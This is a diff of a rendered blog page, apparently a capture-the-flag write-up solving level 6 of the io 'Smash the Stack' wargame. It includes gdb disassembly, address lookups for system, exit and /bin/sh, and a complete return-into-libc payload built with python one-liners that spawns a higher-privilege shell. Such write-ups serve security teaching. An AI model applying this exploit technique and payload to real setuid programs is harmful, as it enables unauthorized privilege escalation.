-<p>To exploit this we are going to use the technique <a href="http://insecure.org/sploits/linux.libc.return.lpr.sploit.html">Return Into Lib C</a>. What we have to do is overwrite the return address <code>0x080486af</code> with the system address and then build a fake stack such that when we resume the execution at the direction of system it sees a valid stack. It would be as simple as put the direction of exit followed by the direction of the string <code>/bin/sh</code>. All these directions can be uncovered with <code>gdb</code>.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>p system
+<blockquote>
+  <ul>
+    <li>it will use at most n bytes from src; and<br />
+     *  src does not need to be null-terminated if it contains n or more bytes.</li>
+  </ul>
+</blockquote>
+
+<p>Basically strcat will append the src string until we get the <code class="highlighter-rouge">\0</code>. How we want to overflow the stack of greeting in the function <code class="highlighter-rouge">greetuser</code> we should look how the stack looks like when this function is called. To find out we will use <code class="highlighter-rouge">gdb</code>.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="gp">gdb-peda$ </span>disas greetuser
+Dump of assembler code <span class="k">for function </span>greetuser:
+   0x0804851c &lt;+0&gt;:	push   ebp
+   0x0804851d &lt;+1&gt;:	mov    ebp,esp
+   0x0804851f &lt;+3&gt;:	sub    esp,0x58
+   0x08048522 &lt;+6&gt;:	mov    eax,ds:0x8049964
+   0x08048527 &lt;+11&gt;:	cmp    eax,0x1
+   0x0804852a &lt;+14&gt;:	je     0x8048540 &lt;greetuser+36&gt;
+   0x0804852c &lt;+16&gt;:	cmp    eax,0x2
+   0x0804852f &lt;+19&gt;:	je     0x804855c &lt;greetuser+64&gt;
+   0x08048531 &lt;+21&gt;:	<span class="nb">test   </span>eax,eax
+   0x08048533 &lt;+23&gt;:	jne    0x8048574 &lt;greetuser+88&gt;
+   0x08048535 &lt;+25&gt;:	lea    eax,[ebp-0x48]
+   0x08048538 &lt;+28&gt;:	mov    DWORD PTR <span class="o">[</span>eax],0x206948
+   0x0804853e &lt;+34&gt;:	jmp    0x8048574 &lt;greetuser+88&gt;
+   0x08048540 &lt;+36&gt;:	lea    eax,[ebp-0x48]
+   0x08048543 &lt;+39&gt;:	mov    DWORD PTR <span class="o">[</span>eax],0x6e656942
+   0x08048549 &lt;+45&gt;:	mov    DWORD PTR <span class="o">[</span>eax+0x4],0x756e6576
+   0x08048550 &lt;+52&gt;:	mov    WORD PTR <span class="o">[</span>eax+0x8],0x2065
+   0x08048556 &lt;+58&gt;:	mov    BYTE PTR <span class="o">[</span>eax+0xa],0x0
+   0x0804855a &lt;+62&gt;:	jmp    0x8048574 &lt;greetuser+88&gt;
+   0x0804855c &lt;+64&gt;:	lea    eax,[ebp-0x48]
+   0x0804855f &lt;+67&gt;:	mov    DWORD PTR <span class="o">[</span>eax],0x6c6c6957
+   0x08048565 &lt;+73&gt;:	mov    DWORD PTR <span class="o">[</span>eax+0x4],0x6d6d6f6b
+   0x0804856c &lt;+80&gt;:	mov    DWORD PTR <span class="o">[</span>eax+0x8],0x206e65
+   0x08048573 &lt;+87&gt;:	nop
+   0x08048574 &lt;+88&gt;:	lea    eax,[ebp+0x8]
+   0x08048577 &lt;+91&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
+   0x0804857b &lt;+95&gt;:	lea    eax,[ebp-0x48]
+   0x0804857e &lt;+98&gt;:	mov    DWORD PTR <span class="o">[</span>esp],eax
+   0x08048581 &lt;+101&gt;:	call   0x80483d0 &lt;strcat@plt&gt;
+   0x08048586 &lt;+106&gt;:	lea    eax,[ebp-0x48]
+   0x08048589 &lt;+109&gt;:	mov    DWORD PTR <span class="o">[</span>esp],eax
+   0x0804858c &lt;+112&gt;:	call   0x80483f0 &lt;puts@plt&gt;
+   0x08048591 &lt;+117&gt;:	leave
+   0x08048592 &lt;+118&gt;:	ret
+End of assembler dump.
+<span class="gp">gdb-peda$ </span>b <span class="k">*</span> 0x0804857e  ; Breakpoint before to call strcat
+<span class="gp">gdb-peda$ </span>r AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBB
+<span class="gp">gdb-peda$ </span>x/64xw <span class="nv">$esp</span>
+</code></pre>
+</div>
+
+<p><img src="/public/images/stackio6.png" alt="stackio6" /></p>
+
+<p>To exploit this we are going to use the technique <a href="http://insecure.org/sploits/linux.libc.return.lpr.sploit.html">Return Into Lib C</a>. What we have to do is overwrite the return address <code class="highlighter-rouge">0x080486af</code> with the system address and then build a fake stack such that when we resume the execution at the direction of system it sees a valid stack. It would be as simple as put the direction of exit followed by the direction of the string <code class="highlighter-rouge">/bin/sh</code>. All these directions can be uncovered with <code class="highlighter-rouge">gdb</code>.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="gp">gdb-peda$ </span>p system
 <span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ea9c30 &lt;system&gt;
-gdb-peda<span class="nv">$ </span>p <span class="nb">exit</span>
+<span class="gp">gdb-peda$ </span>p <span class="nb">exit</span>
 <span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e9d270 &lt;<span class="nb">exit</span>&gt;
-gdb-peda<span class="nv">$ </span>searchmem /bin/sh
-Searching <span class="k">for</span> <span class="s1">&#39;/bin/sh&#39;</span> in: None ranges
-Found <span class="m">1</span> results, display max <span class="m">1</span> items:
-libc : 0xb7faafb4 <span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span>
-</code></pre></div>
-<p>So the beginning of the <code>argv[1]</code> must be the direction of <code>
-exit</code> and then the direction of the string <code>/bin/sh</code> followed by as much data as needed until we reach the return address to overwrite it with the direction of system. To exploit it more easily is better use as language <code>FRANCAIS</code> or <code>DEUTSCH</code> since that will fill the <code>greeting</code> variable with more data. Since with the <code>english</code> version the <code>id</code> was initialize to <code>0</code> making the strcat function stopping when it reaches that value.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">level6@io:/levels<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$LANG</span>
+<span class="gp">gdb-peda$ </span>searchmem /bin/sh
+Searching <span class="k">for</span> <span class="s1">'/bin/sh'</span> <span class="k">in</span>: None ranges
+Found 1 results, display max 1 items:
+libc : 0xb7faafb4 <span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
+</code></pre>
+</div>
+
+<p>So the beginning of the <code class="highlighter-rouge">argv[1]</code> must be the direction of `<br />
+exit<code class="highlighter-rouge"> and then the direction of the string </code>/bin/sh<code class="highlighter-rouge"> followed by as much data as needed until we reach the return address to overwrite it with the direction of system. To exploit it more easily is better use as language </code>FRANCAIS<code class="highlighter-rouge"> or </code>DEUTSCH<code class="highlighter-rouge"> since that will fill the </code>greeting<code class="highlighter-rouge"> variable with more data. Since with the </code>english<code class="highlighter-rouge"> version the </code>id<code class="highlighter-rouge"> was initialize to </code>0` making the strcat function stopping when it reaches that value.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="gp">level6@io:/levels$ </span><span class="nb">echo</span> <span class="nv">$LANG</span>
 en_GB.UTF-8
-level6@io:/levels<span class="nv">$ LANG</span><span class="o">=</span>de_GB.UTF-8
-level6@io:/levels<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$LANG</span>
+<span class="gp">level6@io:/levels$ </span><span class="nv">LANG</span><span class="o">=</span>de_GB.UTF-8
+<span class="gp">level6@io:/levels$ </span><span class="nb">echo</span> <span class="nv">$LANG</span>
 de_GB.UTF-8
-</code></pre></div>
+</code></pre>
+</div>
+
 <p>And finally we get a fresh shell calling it as follows.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">level6@io:/levels<span class="nv">$ </span>./level06 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;\x70\xd2\xe9\xb7&quot; + &quot;\xb4\xaf\xfa\xb7&quot; + &quot;A&quot;*32&#39;</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;B&quot;*25 + &quot;\x30\x9c\xea\xb7&quot;&#39;</span><span class="sb">`</span>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="gp">level6@io:/levels$ </span>./level06 <span class="sb">`</span>python -c <span class="s1">'print "\x70\xd2\xe9\xb7" + "\xb4\xaf\xfa\xb7" + "A"*32'</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s1">'print "B"*25 + "\x30\x9c\xea\xb7"'</span><span class="sb">`</span>
 Willkommen p�鷴��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB0��
-sh-4.2<span class="nv">$ </span>id
+<span class="gp">sh-4.2$ </span>id
 <span class="nv">uid</span><span class="o">=</span>1006<span class="o">(</span>level6<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1006<span class="o">(</span>level6<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span>,1006<span class="o">(</span>level6<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
 sh-4.2<span class="err">$</span>
-</code></pre></div>
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level06iosmash&text=Level 06 I/O Smash the Stack&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+</code></pre>
+</div>
+<p>If you liked this post, you can <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level06iosmash&amp;text=Level 06 I/O Smash the Stack&amp;via=alvaro_fe">share it with your followers</a> or <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
 
   </div>
   
@@ -418,6 +446,7 @@ or
     
   
 </div>
+
     </div>
 
     
